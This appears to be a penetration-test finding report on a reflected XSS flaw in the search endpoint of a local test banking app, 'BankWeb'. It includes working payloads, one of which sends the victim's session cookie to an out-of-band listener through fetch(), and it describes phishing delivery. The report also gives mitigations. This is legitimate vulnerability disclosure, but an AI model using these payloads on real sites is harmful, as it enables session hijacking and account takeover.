# Issue #10 — Reflected Cross-Site Scripting (XSS) in PortalSearch

| Field         | Details                                          |
|---------------|--------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337/PortalSearch`   |
| **Severity**  | High                                             |
| **CVSS v3.1** | 8.2                                              |
| **Vector**    | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N             |
| **Category**  | Injection — Reflected Cross-Site Scripting  |

---

## Summary

The `/PortalSearch` endpoint reflects the value of the `SearchString` query parameter directly into the HTML response body without any output encoding. An attacker can craft a malicious URL containing a JavaScript payload and deliver it to a victim — when the victim clicks the link, the payload executes immediately in their browser within the application's origin. This was confirmed both as a basic proof-of-concept and as a weaponised session-stealing payload using an out-of-band exfiltration server.

Unlike the stored XSS vulnerabilities identified in Issue #09, reflected XSS requires the victim to follow a crafted link, making delivery via phishing or social engineering the primary attack vector.

---

## Steps to Reproduce

1. While authenticated, navigate to the following URL (or send it as a crafted link to a target):

   ```
   http://localhost:1337/PortalSearch?SearchString=<img src=x onerror=alert(1)/>
   ```

   URL-encoded form:

   ```
   http://localhost:1337/PortalSearch?SearchString=%3cimg%20src%3dx%20onerror%3dalert(1)%2f%3e
   ```

2. Observe that the page loads and the `alert(1)` dialog fires immediately — no further interaction required.

3. To confirm session cookie exfiltration, substitute the basic PoC with a weaponised payload pointing to an out-of-band listener (e.g. Burp Collaborator or [webhook.site](https://webhook.site)):

   ```
   <img src=x onerror="fetch('https://[REDACTED-COLLABORATOR-DOMAIN]?c='+document.cookie)"/>
   ```

4. Deliver the crafted URL to a target user (e.g. via a phishing email or in-app message).
5. Observe the victim's session cookie arriving at the listener upon page load.

---

## Proof of Concept

### Basic PoC — Alert

**Request:**

```http
GET /PortalSearch?SearchString=%3cimg%20src%3dx%20onerror%3dalert(1)%2f%3e HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response (excerpt):**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Jul 2025 09:50:10 GMT
Server: Kestrel
Content-Length: 4827

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    ...
    <p>Results for search: <img src=x onerror=alert(1)/></p>
    ...
```

The `SearchString` value is embedded verbatim into the HTML response inside a `<p>` tag, with no HTML entity encoding applied. The browser parses the injected `<img>` tag, fails to load the non-existent `src`, and fires the `onerror` handler — executing arbitrary JavaScript.

---

### Weaponised PoC — Session Cookie Exfiltration

The following payload was used to confirm real-world exploitability by exfiltrating the session cookie to an out-of-band server:

```
<img src=x onerror="fetch('https://[REDACTED-COLLABORATOR-DOMAIN]?c='+document.cookie)"/>
```

Full crafted URL:

```
http://localhost:1337/PortalSearch?SearchString=%3cimg%20src%3dx%20onerror%3d%22fetch('https%3a%2f%2f[REDACTED-COLLABORATOR-DOMAIN]%3fc%3d'%2bdocument.cookie)%22%2f%3e
```

> **Note:** The out-of-band callback domain has been redacted. The exfiltration was confirmed during testing via an interactivity server (Burp Suite Collaborator). An equivalent listener can be set up at [webhook.site](https://webhook.site) for validation purposes.

Upon a victim loading the crafted URL, their `document.cookie` — including the `SessionId` value — is transmitted to the attacker-controlled server as a query parameter, enabling immediate session hijacking without requiring any further interaction.

---

## Impact

- **Session hijacking** — the weaponised payload exfiltrates the victim's `SessionId` cookie to an attacker-controlled server in a single request. Because the session cookie lacks the `HttpOnly` flag (as noted in Issue #09), it is accessible to JavaScript and can be stolen in this manner.
- **No authentication required to craft the payload** — the `SearchString` parameter is processed regardless of authentication state, meaning the crafted URL can be sent to unauthenticated users on the login page as well if the parameter is reflected there too.
- **Phishing amplification** — in the context of a banking application, a convincing phishing email directing a user to what appears to be a legitimate URL on the bank's own domain is significantly more credible than a link to an external site, substantially increasing the likelihood of a victim clicking it.
- **Admin targeting** — combined with the admin panel XSS in Issue #09 (Vector B), an attacker can cross-reference multiple XSS vectors to maximise the chance of capturing a high-privilege session.
- **Chained account takeover** — a captured `SessionId` can be replayed directly in the browser to assume the victim's authenticated session, enabling fund transfers, personal data access, and account modification without knowing the victim's credentials.

---

## Recommended Mitigations

1. **Encode all user-controlled values before rendering them in HTML responses.** In ASP.NET Core Razor views, use the default `@` syntax which applies HTML encoding automatically — never use `@Html.Raw()` for user input:

   ```html
   <!-- Vulnerable -->
   <p>Results for search: @Html.Raw(Model.SearchString)</p>

   <!-- Safe — Razor encodes by default -->
   <p>Results for search: @Model.SearchString</p>
   ```

2. **Validate and reject inputs that contain HTML characters** at the model binding or controller layer, consistent with the server-side input validation recommended in Issue #09.

3. **Set the `HttpOnly` flag on session cookies** to prevent JavaScript from accessing them, limiting the impact of any XSS that bypasses other controls (see Issue #09 for implementation details).

4. **Implement a Content Security Policy** to restrict the origins to which the browser can make requests, neutralising the out-of-band exfiltration technique demonstrated here:

   ```
   Content-Security-Policy: default-src 'self'; connect-src 'self'; script-src 'self';
   ```

5. **Audit all other query parameters and form fields** that are reflected into server-rendered HTML responses — this pattern is likely present beyond the `SearchString` parameter alone.